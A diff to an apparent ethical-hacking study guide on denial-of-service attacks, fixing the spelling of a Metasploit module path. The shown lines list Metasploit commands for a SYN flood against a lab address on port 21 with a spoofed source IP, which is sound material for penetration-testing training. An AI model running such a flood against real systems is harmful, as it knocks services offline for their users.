@@ -13,7 +13,7 @@ DoS and DDoS attacks exploit vulnerabilities in the implementation of TCP/IP mod
 As an expert ethical hacker or pen tester, you must have the required knowledge to perform DoS and DDoS attacks to be able to test systems in the target network.
 
 #### 1.1 Perform DOS (syn flooding) using Metasploit
-- `use auxillary/dos/tcp/synflood`
+- `use auxiliary/dos/tcp/synflood`
 - `set RHOST 192.168.18.110`
 - `set RPORT 21`
 - `set SHOST 192.168.18.1`    \\Spoofed IP
